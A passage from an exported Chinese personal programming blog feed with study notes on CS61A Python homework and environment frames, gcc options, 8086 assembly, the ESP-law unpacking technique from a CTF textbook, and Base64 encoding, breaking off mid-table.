新添加的远程仓库</span></span><br></pre></td></tr></tbody></table></figure><h3 id="更改远程仓库的-url">更改远程仓库的 URL</h3><p>使用<code>git remote set-url</code>命令更改 URL。</p><p>参考：https://docs.github.com/cn/get-started/getting-started-with-git/managing-remote-repositories#changing-a-remote-repositorys-url</p>]]></content>
    
    
    <categories>
      
      <category>git</category>
      
    </categories>
    
    
    <tags>
      
      <tag>git</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CS61A(sp21)-Homework 01</title>
    <link href="/2022/10/10/CS61A-Homework-01/"/>
    <url>/2022/10/10/CS61A-Homework-01/</url>
    
    <content type="html"><![CDATA[<h1 id="homework-01--q5if-function-vs-statement">Homework 01--Q5：IfFunction vs Statement</h1><p>题目代码如下：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">if_function</span>(<span class="params">condition, true_result, false_result</span>):</span><br><span class="line">    <span class="string">"""Return true_result if condition is a true value, and</span></span><br><span class="line"><span class="string">    false_result otherwise.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; if_function(True, 2, 3)</span></span><br><span class="line"><span class="string">    2</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; if_function(False, 2, 3)</span></span><br><span class="line"><span class="string">    3</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; if_function(3==2, 'equal', 'not equal')</span></span><br><span class="line"><span class="string">    'not equal'</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; if_function(3&gt;2, 'bigger', 'smaller')</span></span><br><span class="line"><span class="string">    'bigger'</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> condition:</span><br><span class="line">        <span class="keyword">return</span> true_result</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> false_result</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">with_if_statement</span>():</span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; result = with_if_statement()</span></span><br><span class="line"><span class="string">    61A</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; print(result)</span></span><br><span class="line"><span class="string">    None</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> cond():</span><br><span class="line">        <span class="keyword">return</span> true_func()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> false_func()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">with_if_function</span>():</span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; result = with_if_function()</span></span><br><span class="line"><span class="string">    Welcome to</span></span><br><span class="line"><span class="string">    61A</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; print(result)</span></span><br><span class="line"><span class="string">    None</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">return</span> if_function(cond(), true_func(), false_func())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cond</span>():</span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">true_func</span>():</span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">false_func</span>():</span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br></pre></td></tr></tbody></table></figure><p>题目要求我们补全代码，并且要符合注释里的输出结果。</p><p>分析代码，将<code>code()</code>、<code>true_func()</code>、<code>false_func()</code>带入<code>if_function(condition, true_result, false_result)</code>函数中，得到：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> cond():</span><br><span class="line">    <span class="keyword">return</span> true_func()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">return</span> false_func()</span><br></pre></td></tr></tbody></table></figure><p>与<code>with_if_statement()</code>函数中的代码相同。我想了半天也没明白相同的代码为什么输出结果不同，后来查看正确答案才恍然大悟。</p><p>当<code>with_if_function()</code>函数执行<code>return if_function(cond(), true_func(), false_func())</code>语句时，调用<code>if_function()</code>函数，而括号中的三个参数在函数调用时必须是确定的，意味着<code>code()</code>、<code>true_func()</code>、<code>false_func()</code>这三个函数在这个过程都需要被求值，相当于这三个函数都被调用过了，而<code>with_if_statement()</code>只调用了<code>code()</code>、<code>true_func()</code>这两个函数或者<code>code()</code>、<code>false_func()</code>这两个函数，因此<code>with_if_function()</code>比<code>with_if_statement()</code>多输出一行也就能够理解了。</p><p>下面是我的题解：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">cond</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">true_func</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"Welcome to"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">false_func</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"61A"</span>)</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CS61A</tag>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CS61A(sp21)-Lecture2</title>
    <link href="/2022/10/10/CS61A-frame/"/>
    <url>/2022/10/10/CS61A-frame/</url>
    
    <content type="html"><![CDATA[<p>参考资料：http://composingprograms.com/pages/13-defining-new-functions.html#calling-user-defined-functions</p><p>最近在学习CS61A，学到了一个新概念：frame</p><h1 id="frame">Frame</h1><h2 id="定义">定义</h2><p>An environment in which an expression is evaluated consists of asequence of <em>frames</em>, depicted as boxes. Each frame contains<em>bindings</em>, each of which associates a name with itscorresponding value.</p><p>当我们对表达式求值时，实际上是在当前环境中求值，而该环境由一系列的“框架”组成。每个框架都包含绑定关系，将名称与其相应值相关联。</p><h2 id="global-frame">global frame</h2><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> pi</span><br><span class="line">tau = <span class="number">2</span> * pi</span><br></pre></td></tr></tbody></table></figure><p>上述示例的环境中就只有 the global frame ，如下图所示</p><p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20221008231614912.png" alt="image-20221008231614912"><br>http://composingprograms.com/tutor.html（可通过该链接测试代码）</p><p>import语句导入的函数和用户自定义的函数都被包含在 the global frame中，如下图所示：</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20221008232149245.png" alt="image-20221008232149245"><figcaption aria-hidden="true">image-20221008232149245</figcaption></figure><h2 id="local-frame">local frame</h2><p>调用用户自己定义的函数时，每个实例都有其自己独立的 local frame 。</p><ul><li><p>执行实例前</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20221008235349096.png" alt="image-20221008235349096"><figcaption aria-hidden="true">image-20221008235349096</figcaption></figure></li><li><p>执行实例过程</p><p>使用参数-2调用 square函数，因此创建了一个新的框架（frame），形式参数x绑定到值-2。</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20221008235439472.png" alt="image-20221008235439472"><figcaption aria-hidden="true">image-20221008235439472</figcaption></figure><p>在当前环境中查找名称x，该环境由显示的两个框架组成。在 mul(x,x)中的两次出现，且均为-2，因此 square 函数返回 4 。</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20221008235453861.png" alt="image-20221008235453861"><figcaption aria-hidden="true">image-20221008235453861</figcaption></figure></li><li><p>执行完成</p><p>square所在的框架会消失，这里保留只是方便观察。</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20221010103200749.png" alt="image-20221010103200749"><figcaption aria-hidden="true">image-20221010103200749</figcaption></figure></li></ul>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CS61A</tag>
      
      <tag>Python</tag>
      
      <tag>frame</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>gcc入门</title>
    <link href="/2022/08/31/gcc/"/>
    <url>/2022/08/31/gcc/</url>
    
    <content type="html"><![CDATA[<p>参考：http://c.biancheng.net/gcc/</p><p>相关资料：</p><p>https://www.cnblogs.com/fnlingnzb-learner/p/8059251.html动态库和静态库</p><p>https://bravey.github.io/2019-04-25-GCC%E7%9A%84%E7%BC%96%E8%AF%91%E9%80%89%E9%A1%B9gcc编译选项</p><h1 id="gcc">GCC</h1><p>GCC全称 the GNU Compiler Collection ，是一套<a href="https://zh.wikipedia.org/wiki/編程語言">编程语言</a><a href="https://zh.wikipedia.org/wiki/编译器">编译器</a>，以<a href="https://zh.wikipedia.org/wiki/GPL">GPL</a>及<a href="https://zh.wikipedia.org/wiki/LGPL">LGPL</a>许可证所发行的<a href="https://zh.wikipedia.org/wiki/自由軟體">自由软件</a>，也是<a href="https://zh.wikipedia.org/wiki/GNU計劃">GNU计划</a>的关键部分，也是<a href="https://zh.wikipedia.org/wiki/GNU工具链">GNU工具链</a>的主要组成部分之一。可处理<a href="https://zh.wikipedia.org/wiki/Fortran">Fortran</a>、<a href="https://zh.wikipedia.org/wiki/Pascal_(程式語言)">Pascal</a>、<a href="https://zh.wikipedia.org/wiki/Objective-C">Objective-C</a>、<a href="https://zh.wikipedia.org/wiki/Java">Java</a>、<a href="https://zh.wikipedia.org/wiki/Ada">Ada</a>，<a href="https://zh.wikipedia.org/wiki/Go">Go</a>与其他语言。</p><p>GCC中包含gcc和g++，分别处理C语言和C++。关于这两者的区别可参考http://c.biancheng.net/view/7936.html</p><h2 id="gcc使用技巧">gcc使用技巧</h2><ol type="1"><li><p>当文件没有扩展名时，可使用 <code>-x</code>选项指明当前文件的类型。比如当前有个文件demo，当直接使用gccdemo会报错，因为GCC编译器无法识别demo这个没有扩展名的文件，因此使用<code>gcc -xc demo</code> （将文件当作C语言处理）。</p></li><li><p>gcc + 文件名，生成对应的可执行文件，默认为a.out 。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ls-jc2uT1jQ:~<span class="comment"># gcc helloworld.c</span></span><br><span class="line">root@ls-jc2uT1jQ:~<span class="comment"># ./a.out</span></span><br><span class="line">hello world!</span><br></pre></td></tr></tbody></table></figure></li><li><p><code>-o</code>选项指定生成的可执行文件的文件名。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ls-jc2uT1jQ:~<span class="comment"># gcc helloworld.c -o helloworld         #用来指定要生成的文件名。</span></span><br><span class="line">root@ls-jc2uT1jQ:~<span class="comment"># ./helloworld</span></span><br><span class="line">hello world!</span><br></pre></td></tr></tbody></table></figure></li><li><p><code>-E</code>选项可控制GCC编译器仅对源码做<strong>预处理</strong>操作。<br>所谓预处理操作，主要是处理那些源文件和头文件中以# 开头的命令（比如 #include、#define、#ifdef等），并删除程序中所有的注释 // 和 /* ... */。</p><p>一般将预处理的内容保存在.i后缀的文件中 :</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ls-jc2uT1jQ:~<span class="comment"># gcc -E helloworld.c -o helloworld.i</span></span><br></pre></td></tr></tbody></table></figure></li><li><p><code>-S</code>选项可令GCC编译器仅将指定文件加工至<strong>编译阶段</strong>，并生成对应的汇编代码文件。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ls-jc2uT1jQ:~<span class="comment"># gcc -S helloworld.i         #GCC编译器只需编译此文件。</span></span><br><span class="line">root@ls-jc2uT1jQ:~<span class="comment"># gcc -S helloworld.c         #GCC编译器需要对其进行预处理和编译这两步操作。</span></span><br></pre></td></tr></tbody></table></figure><p>以上这两行命令均能生成与原文件名相同的后缀为.s的文件（内容为汇编代码）。</p></li><li><p><code>-c</code>选项可让GCC编译器将指定文件加工至<strong>汇编阶段</strong>（但并不执行链接操作），并生成对应的目标文件。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ls-jc2uT1jQ:~<span class="comment"># gcc -c helloworld.s         #生成了与原文件名相同的后缀为.o的文件，将汇编代码转变成机器可以执行的指令</span></span><br></pre></td></tr></tbody></table></figure><p>-c选项同样对.c和.i文件有用。</p></li><li><p>gcc执行<strong>链接操作</strong>。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ls-jc2uT1jQ:~<span class="comment"># gcc helloworld.o -o helloworld           #生成可执行文件helloworld。</span></span><br></pre></td></tr></tbody></table></figure></li><li><p><code>-g</code>选项可产生调试信息，可以使用<strong>gdb</strong>调试可执行文件。</p></li><li><p><code>-m32</code>选项指定生成32位机器的汇编代码，同理<code>-m64</code>则生成64位机器汇编代码。</p><p>参考文章：https://blog.csdn.net/vantian/article/details/78748653?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166191228716782388062237%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=166191228716782388062237&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2<sub>all</sub>first_rank_ecpm_v1~pc_rank_34-1-78748653-null-null.142</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>GCC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>gcc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>汇编语言（六）</title>
    <link href="/2022/08/31/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%EF%BC%88%E5%85%AD%EF%BC%89/"/>
    <url>/2022/08/31/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%EF%BC%88%E5%85%AD%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="汇编语言六and和or灵活定位内存地址">汇编语言（六）——and和or，灵活定位内存地址</h1><h2 id="and-和-or-指令及其应用">and 和 or 指令及其应用</h2><h3 id="and-和-or">and 和 or</h3><ol type="1"><li><p>and 指令：逻辑与指令，按位进行与运算。</p><p>示例：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al, 01100011B</span><br><span class="line">and al, 00111011B</span><br></pre></td></tr></tbody></table></figure><p>执行后：al = 00100011B</p></li><li><p>or 指令：逻辑或指令，按位进行或运算。</p><p>示例：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al, 01100011B</span><br><span class="line">or al, 00111011B</span><br></pre></td></tr></tbody></table></figure><p>执行后：al = 01111011B</p></li></ol><h3 id="大小写转换问题">大小写转换问题</h3><p>根据规律可知：大写字母 + 20H =小写字母。因此当字母对应的ASCII码大于等于61H时，则为小写字母，而已学的指令中无法实现判断的功能，于是寻找新的规律。可以看出，字母对应的ASCII码的二进制形式，除<strong>第5位</strong>（位数从0开始计算）外，大写字母与小写字母的其他各位都一样。大写字母第5位为<strong>0</strong>，小写字母第5位为<strong>1</strong>。通过使用and 和 or 指令对大小写进行转换。</p><p>完整程序如下：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg,ds:datasg</span><br><span class="line"></span><br><span class="line">datasg segment</span><br><span class="line"> db 'BaSiC'</span><br><span class="line"> db 'iNfOrMaTiOn'</span><br><span class="line">datasg ends</span><br><span class="line"></span><br><span class="line">codesg segment</span><br><span class="line"> start: mov ax,datasg</span><br><span class="line">        mov ds,ax                        ;设置ds指向datasg段</span><br><span class="line">        mov bx,0                         ;设置(bx)=0，ds:bx指向'BaSiC'的第一个字母</span><br><span class="line">        mov cx,5                         ;设置循环次数 5，因为'BaSiC'有5个字母</span><br><span class="line">     s: mov al,[bx]                      ;将ASCII码从ds:bx所指向的单元中取出</span><br><span class="line">        and al,11011111B                 ;将 al 中的ASCII码的第5位 置为0，变为大写字母</span><br><span class="line">        mov [bx],al                      ;将转变后的ASCII码写回原单位</span><br><span class="line">        inc bx                           ;(bx)加1，ds:bx指向下一个字母</span><br><span class="line">        loop s</span><br><span class="line">        </span><br><span class="line">        mov bx,5                         ;设置(bx) = 5，ds:bx指向'iNfOrMaTiOn'的第一个字母</span><br><span class="line">        mov cx,11                        ;设置循环次数 11，因为'iNfOrMaTiOn'有11个字母</span><br><span class="line">    s0: mov al,[bx]</span><br><span class="line">        or al,00100000B                  ;将al中的ASCII码的第5位 置为1，变为小写字母</span><br><span class="line">        mov [bx],al</span><br><span class="line">        inc bx</span><br><span class="line">        loop s0</span><br><span class="line">        </span><br><span class="line">        mov ax,4c00h</span><br><span class="line">        int 21h</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></tbody></table></figure><h2 id="定位内存地址">定位内存地址</h2><h3 id="bxidata">[bx+idata]</h3><p>[bx+idata]表示一个内存单元，它的偏移地址为 (bx)+idata（bx中的数值加上idata）。</p><p>对于上面的程序，datasg段中的两个字符串，一个起始地址为0，另一个为5。于是我们可以将这两个字符串看作两个数组，分别用<strong>[0+bx]</strong> 和 <strong>[5+bx]</strong>来定位这两个字符串。</p><p>改进的程序如下：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">   mov ax,datasg</span><br><span class="line">   mov ds,ax</span><br><span class="line">   mov bx,0</span><br><span class="line">   mov cx,5</span><br><span class="line"></span><br><span class="line">s: mov al,[bx]                ;定位第一个字符串的字符</span><br><span class="line">   and al,11011111b</span><br><span class="line">   mov [bx],al</span><br><span class="line">   mov al,[5+bx]              ;定位第二个字符串的字符</span><br><span class="line">   or al,00100000b</span><br><span class="line">   mov [5+bx],al</span><br><span class="line">   inc bx</span><br><span class="line">   loop s</span><br></pre></td></tr></tbody></table></figure><p>其中也可将<code>[bx]</code>写成<code>0[bx]</code>，<code>[5+bx]</code>写成<code>5[bx]</code>。</p><h3 id="si-和-di">SI 和 DI</h3><p>si 和 di 是8086CPU中和 bx 功能相近的寄存器，si 和 di<strong>不能</strong>分成两个8位寄存器来使用。</p><h3 id="bxsi-和-bxdi">[bx+si] 和 [bx+di]</h3><p>[bx+si] 表示一个内存单元，它的偏移地址为 (bx) + (si)（即 bx中的数值加上 si 中的数值）。</p><p>指令<code>mov ax,[bx+si]</code>的数学化描述为：(ax)=((ds)*16+(bx)+(si))。</p><h3 id="bxsiidata-和-bxdiidata">[bx+si+idata] 和 [bx+di+idata]</h3><p>[bx+si+idata]表示一个内存单元，它的偏移地址为 (bx) + (si) +idata（即bx 中的数据加上 si 中的数据再加上 idata）。</p><p>指令<code>mov ax,[bx+si+idata]</code>的数学化描述为：(ax)=((ds)*16+(bx)+(si)+idata)。</p>]]></content>
    
    
    <categories>
      
      <category>汇编</category>
      
    </categories>
    
    
    <tags>
      
      <tag>汇编</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ESP定律法</title>
    <link href="/2022/08/29/ESP%E5%AE%9A%E5%BE%8B%E6%B3%95/"/>
    <url>/2022/08/29/ESP%E5%AE%9A%E5%BE%8B%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>参考：https://zhuanlan.zhihu.com/p/117294551</p><p>​ 《从0到1：CTFer成长之路》P260</p><p>使用文件：https://book.nu1l.com/tasks/#/pages/reverse/5.3</p><h2 id="原理">原理</h2><p>堆栈平衡。首先通过pushad将所有寄存器一次性压入栈，然后通过popad指令恢复寄存器。</p><h2 id="过程">过程</h2><p>首先打开文件找到pushad</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220405175227302.png" alt="image-20220405175227302"><figcaption aria-hidden="true">image-20220405175227302</figcaption></figure><p>单步执行该指令（按F8键），此时发现ESP（<strong>栈顶指针</strong>）发生变化</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220405175320125.png" alt="image-20220405175320125"><figcaption aria-hidden="true">image-20220405175320125</figcaption></figure><p>此时右击ESP选择<code>HW break[ESP]</code>，设置硬件读取断点，则当popad进行还原寄存器时会在该处发生中断。然后按F9键运行程序，在断点处中断，</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220405180030247.png" alt="image-20220405180030247"><figcaption aria-hidden="true">image-20220405180030247</figcaption></figure><p>此时可删除断点，以防后续触发。然后便是分析图中指令。</p><p>单击jmp语句，按F4键运行至此，再按F8键执行跳转，此时可发现OEP。</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220405180412785.png" alt="image-20220405180412785"><figcaption aria-hidden="true">image-20220405180412785</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>逆向工程</category>
      
      <category>脱壳</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ESP</tag>
      
      <tag>OD</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Base64</title>
    <link href="/2022/08/29/Base64/"/>
    <url>/2022/08/29/Base64/</url>
    
    <content type="html"><![CDATA[<p>参考维基百科（https://zh.wikipedia.org/wiki/Base64）、CTF Wiki</p><p><strong>Base64</strong>是一种基于64个可打印字符来表示<a href="https://zh.wikipedia.org/wiki/二进制">二进制数据</a>的表示方法。由于2的6次方等于64，正好对应了64个字符，所以每6个<a href="https://zh.wikipedia.org/wiki/位元">比特</a>为一个单元，对应某个可打印字符。</p><p>转换的时候，将<strong>3 字节</strong>的数据，先后放入一个 <strong>24位</strong>的缓冲区中，先来的字节占高位。数据不足 3字节的话，于缓冲器中剩下的比特用 0 补足。</p><p>通常而言 在逆向题目中，当我们能找到<br><code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</code><br>这样的索引表，再经过简单的分析基本就能判定是 Base64 编码。</p><p><strong>示例</strong>：</p><p>编码“Man”的结果为<code>TWFu</code>，详细原理如下：</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220407163844733.png" alt="image-20220407163844733"><figcaption aria-hidden="true">image-20220407163844733</figcaption></figure><p>如果要编码的字节数不能被3整除，最后会多出1个或2个字节，那么可以使用下面的方法进行处理：先使用0字节值在末尾补足，使其能够被3整除，然后再进行Base64的编码。在编码后的Base64文本后加上一个或两个<code>=</code>号，代表补足的字节数。也就是说，当最后剩余两个八位(待补足)字节（2个byte）时，最后一个6位的Base64字节块有四位是0值，最后附加上两个等号；如果最后剩余一个八位(待补足)字节（1个byte）时，最后一个6位的base字节块有两位是0值，最后附加一个等号。参考下表：</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220407163920831.png" alt="image-20220407163920831"><figcaption aria-hidden="true">image-20220407163920831</figcaption></figure><p>附：Base64索引表</p><table><colgroup><col style="width: 7%"><col style="width: 7%"><col style="width: 5%"><col style="width: 5%"><col style="width: 7%"><col style="width: 7%"><col style="width: 5%"><col style="width: 5%"><col style="width: 7%"><col style="width: 7%"><col style="width: 5%"><col style="width: 5%"><col style="width: 7%"><col style="width: 7%"><col style="width: 5%"></colgroup><thead><tr class="header"><th style="text-align: center;">十进制</th><th style="text-align: center;">二进制</th><th style="text-align: center;">字符</th><th style="text-align: center;"></th><th style="text-align: center;">十进制</th><th style="text-align: center;">二进制</th><th style="text-align: center;">字符</th><th style="text-align: center;"></th><th style="text-align: center;">十进制</th><th style="text-align: center;">二进制</th><th style="text-align: center;">字符</th><th style="text-align: center;"></th><th style="text-align: center;">十进制</th><th style="text-align: center;">二进制</th><th style="text-align: center;">字符</th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">0</td><td style="text-align: center;">000000</td><td style="text-align: center;">A</td><td style="text-align: center;"></td><td style="text-align: center;">16</td><td style="text-align: center;">010000</td><td style="text-align: center;">Q</td><td style="text-align: center;"></td><td style="text-align: center;">32</td><td style="text-align: center;">100000</td><td style="text-align: center;">g</td><td style="text-align: center;"></td><td style="text-align: center;">48</td><td style="text-align: center;">110000</td><td style="text-align: center;">w</td></tr><tr class="even"><td style="text-align: center;">1</td><td style="text-align: center;">000001</td><td style="text-align: center;">B</td><td style="text-align: center;"></td><td style="text-align: center;">17</td><td style="text-align: center;">010001</td><td style="text-align: center;">R</td><td style="text-align: center;"></td><td style="text-align: center;">33</td><td style="text-align: center;">100001</td><td style="text-align: center;">h</td><td style="text-align: center;"></td><td style="text-align: center;">49</td><td style="text-align: center;">110001</td><td style="text-align: center;">x</td></tr><tr class="odd"><td style="text-align: center;">2</td><td style="text-align: center;">000010</td><td style="text-align: center;">C</td><td style="text-align: center;"></td><td style="text-align: center;">18</td><td style="text-align: center;">010010</td><td style="text-align: center;">S</td><td style="text-align: center;"></td><td style="text-align: center;">34</td><td style="text-align: center;">100010</td><td style="text-align: center;">i</td><td style="text-align: center;"></td><td style="text-align: center;">50</td><td style="text-align: center;">110010</td><td style="text-align: center;">y</td></tr><tr class="even"><td style="text-align: center;">3</td><td style="text-align: center;">000011</td><td style="text-align: center;">D</td><td style="text-align: center;"></td><td style="text-align: center;">19</td><td style="text-align: center;">010011</td><td style="text-align: center;">T</td><td style="text-align: center;"></td><td style="text-align: center;">35</td><td style="text-align: center;">100011</td><td style="text-align: center;">j</td><td style="text-align: center;"></td><td style="text-align: center;">51</td><td style="text-align: center;">110011</td><td style="text-align: center;">z</td></tr><tr class="odd"><td style="text-align: center;">4</td><td style="text-align: center;">000100</td><td style="text-align: center;">E</td><td style="text-align: center;"></td><td style="text-align: center;">20</td><td style="text-align: center;">010100</td><td style="text-align: center;">U</td><td style="text-align: center;"></td><td style="text-align: center;">36</td><td style="text-align: center;">100100</td><td style="text-align: center;">k</td><td style="text-align: center;"></td><td style="text-align: center;">52</td><td style="text-align: center;">110100</td><td style="text-align: center;">0</td></tr><tr class="even"><td style="text-align: center;">5</td><td style="text-align: center;">000101</td><td style="text-align: center;">F</td><td style="text-align: center;"></td><td style="text-align: center;">21</td><td style="text-align: center;">010101</td><td style="text-align: center;">V</td><td style="text-align: center;"></td><td style="text-align: center;">37</td><td style="text-align: center;">100101</td><td style="text-align: center;">l</td><td style="text-align: center;"></td><td style="text-align: center;">53</td><td style="text-align: center;">110101</td><td style="text-align: center;">1</td></tr><tr class="odd"><td style="text-align: center;">6</td><td style="text-align: center;">000110</td><td style="text-align: center;">G</td><td style="text-align: center;"></td><td style="text-align: center;">22</td><td style="text-align: center;">010110</td><td style="text-align: center;">W</td><td style="text-align: center;"></td><td style="text-align: center;">38</td><td style="text-align: center;">100110</td><td style="text-align: center;">m</td><td style="text-align: center;"></td><td style="text-align: center;">54</td><td style="text-align: center;">110110</td><td style="text-align: 